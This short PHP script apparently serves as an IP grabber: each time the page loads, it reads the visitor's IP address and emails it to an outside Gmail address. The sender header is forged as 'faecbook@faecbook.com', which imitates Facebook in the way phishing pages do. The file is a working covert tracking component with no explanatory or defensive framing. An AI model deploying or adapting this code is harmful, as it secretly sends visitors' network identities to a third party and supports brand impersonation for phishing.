<?php
function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$txt= "asd";

$to = "zuck.levi@gmail.com";
$subject = "Új cucc";
$txt = getRealIpAddr();
$headers = "From: faecbook@faecbook.com";
mail($to,$subject,$txt,$headers);


?>
